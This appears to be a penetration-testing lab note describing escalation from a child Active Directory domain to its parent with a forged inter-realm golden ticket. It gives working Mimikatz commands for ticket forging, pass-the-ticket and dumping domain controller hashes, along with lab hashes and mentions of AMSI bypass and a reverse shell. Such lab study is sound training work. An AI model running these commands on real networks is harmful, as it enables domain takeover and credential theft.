# Privesc to Parent domain using KRBTGT hash
#cross-forest-attack

Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash.

1. Since we already have the KRBTGT hash of dollarcorp. Create the inter-realm TGT
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

# Final Ticket Saved to file !
```

| Invoke-Mimikatz-Command | |
| -- | --|
| Kerberos::golden | The mimikatzmodule |
| /domain:dollarcorp.moneycorp.local | FQDN of the currentdomain |
| /sid:S-1-5-21-1874506631-3219952063-538504511 | SID of the currentdomain |
| /sids:S-1-5-21-280534878-1496970234-700767426-519 | SID of the enterprise admins group of the parent domain |
| /rc4:7ef5be456dc8d7450fb8f5f7348746c5 | RC4 of the trust key |
| /user:Administrator | User to impersonate |
| /service:krbtgt | Targetservice in the parent domain |
| /target:moneycorp.local | FQDN of the parent domain |
|  /ticket:C:\AD\Tools\kekeo\trust_tkt.kirbi | Path whereticket is to be saved |

2. Inject the ticket
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

# * File: 'C:\AD\Tools\krbtgt_tkt.kirbi': OK

# test if ticket is valid
gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
```

3. Get reverse shell
Refer to [[Reverse shell using schtasks]]

4. Download and execute Invoke-Mimikatz to dump Hashes of parent DC
```powershell

# bypass AMSI

# Download Invoke-Mimikatz.ps1

Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

#User : krbtgt
#LM   :
#NTLM : ed277dd7a7a8a88d9ea0de839e454690

```